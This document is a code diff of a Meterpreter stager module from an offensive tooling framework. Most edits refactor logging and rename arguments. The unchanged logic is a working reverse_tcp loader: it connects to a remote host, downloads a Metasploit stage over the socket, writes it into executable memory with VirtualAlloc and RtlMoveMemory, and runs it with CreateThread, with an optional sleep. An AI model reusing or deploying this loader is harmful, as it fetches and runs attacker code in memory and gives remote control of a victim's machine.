@@ -1,7 +1,9 @@
 ########################################################
-### Meterpreter Module
-### Status: migrated 085
+### ShenCode Module
 ###
+### Name: Meterpreter
+### Docs: https://heckhausen.it/shencode/README
+### 
 ########################################################
 
 from utils.style import *
@@ -16,6 +18,8 @@ import struct
 CATEGORY    = 'stager'
 DESCRIPTION = 'Connect back (reverse_tcp) to remote host and receive a stage'
 
+cs = ConsoleStyles()
+
 arglist = {
     'remote_host':         { 'value': None, 'desc': 'Remote host to connect to' },
     'remote_port':         { 'value': 4444, 'desc': 'Remote port to connect to' },
@@ -25,18 +29,18 @@ arglist = {
 }
 
 def register_arguments(parser):
-    parser.add_argument('-p', '--port', default=4444, type=int, required=True, help=arglist['remote_port']['desc'])
+    parser.add_argument('-p', '--remote-port', default=4444, type=int, required=True, help=arglist['remote_port']['desc'])
     parser.add_argument('-r', '--remote-host', type=str, required=True, help=arglist['remote_host']['desc'])
 
     grp = parser.add_argument_group('additional')
-    grp.add_argument('-a', '--arch', choices=['x64', 'x86'], default='x64', type=str, help=arglist['architecture']['desc'])
-    grp.add_argument('-s', '--sleep', default=0, type=int, required=True, help=arglist['sleeptime']['desc'])
+    grp.add_argument('-a', '--architecture', choices=['x64', 'x86'], default='x64', type=str, help=arglist['architecture']['desc'])
+    grp.add_argument('-s', '--sleeptime', default=0, type=int, required=True, help=arglist['sleeptime']['desc'])
     grp.add_argument('-t', '--timeout', default=30, type=int, help=arglist['timeout']['desc'])
 
 class module:
     
     Author          = 'raptor@0xdeadbeef.info, psycore8'
-    Version         = '1.2.7'
+    Version         = '0.9.0'
     DisplayName      = 'METERPRETER-STAGER'
     payload         = any
     payload_size    = int
@@ -51,49 +55,28 @@ class module:
         self.architecture = architecture
         self.sleeptime = sleeptime
 
-    def msg(self, message_type, ErrorExit=False):
-        messages = {
-            'pre.head'      : f'{FormatModuleHeader(self.DisplayName, self.Version)}\n',
-            'proc.sock'     : f'{s_note} Creating Socket...',
-            'proc.con'      : f'{s_ok} Connection established',
-            'proc.stage'    : f'{s_note} Download stage...',
-            'proc.size'     : f'{s_note} Payload size: {self.payload_size} bytes',
-            'proc.stage_ok' : f'{s_ok} Stage downloaded!',
-            'proc.exec'     : f'{s_note} Trying to execute Meterpreter stage...',
-            'inj.alloc'     : f'{s_ok} Memory allocated!',
-            'inj.sleep'     : f'{s_info} Let\'s take a nap for {self.sleeptime} seconds',
-            'inj.exec'      : f'{s_note} Execute payload...',
-            'inj.ok'        : f'{s_ok} Looks good!',
-            'inj.fail'      : f'{s_fail} Payload not executed',
-            'post.done'     : f'{s_ok} DONE!',
-            'error.con'     : f'{s_fail} Connection failed',
-            'error.stage_ok': f'{s_fail} Error during download'
-        }
-        print(messages.get(message_type, f'{message_type} - this message type is unknown'))
-        if ErrorExit:
-            exit()
-
     def CreateSocket(self):
-        self.msg('proc.sock')
+        cs.console_print.note('Creating Socket...')
         socket.setdefaulttimeout(self.timeout)
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         con = self.sock.connect_ex((self.remote_host, int(self.remote_port)))
         if con == 0:
-            self.msg('proc.con')
+            cs.console_print.ok('Connection established')
         else:
-            self.msg('error.con', True)
+            cs.console_print.error('Connection failed')
+            return
 
     def ReceivePayload(self):
         # get 4-byte payload length
         l = struct.unpack("@I", self.sock.recv(4))[0]
 
         # download payload
-        self.msg('proc.stage')
+        cs.console_print.note('Download stage...')
         d = self.sock.recv(l)
         while len(d) < l:
             d += self.sock.recv(l - len(d))
         self.payload_size = len(d)
-        self.msg('proc.size')
+        cs.console_print.note(f'Payload size: {self.payload_size} bytes')
 
         if self.architecture == 'x64':
             self.payload = bytearray(
@@ -106,31 +89,34 @@ class module:
                     + self.sock.fileno().to_bytes(4, byteorder="little")
                     + d)
         if self.payload:
-            self.msg('proc.stage_ok')
+            cs.console_print.ok('Stage downloaded!')
+            #self.msg('proc.stage_ok')
         else:
-            self.msg('error.stage_ok', True)
+            cs.console_print.error('Error during download')
+            return
             
     def LaunchStage(self):
-        self.msg('proc.exec')
+        cs.console_print.note('Trying to execute Meterpreter stage...')
         ptr = VirtualAlloc(0, len(self.payload), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
         if ptr:
-            self.msg('inj.alloc')
+            cs.console_print.ok('Memory allocated!')
             RtlMoveMemory(ptr, bytes(self.payload), len(self.payload))
 
         if self.sleeptime > 0:
-            self.msg('inj.sleep')
+            cs.console_print.info(f'Let\'s take a nap for {self.sleeptime} seconds')
             sleep(self.sleeptime)
         
-        self.msg('inj.exec')
+        cs.console_print.note('Execute payload...')
         ht = CreateThread(None, 0, ptr, None, 0, None)
         if ht:
-            self.msg('inj.ok')
+            cs.console_print.ok('Thread created. Looks good!')
         else:
-            self.msg('inj.fail', True)
+            cs.console_print.error('Payload not executed')
+            return
         WaitForSingleObject(ht, -1)    
 
     def process(self):
-        self.msg('pre.head')
+        cs.module_header(self.DisplayName, self.Version)
         self.CreateSocket()
         self.ReceivePayload()
         if self.relay_output:
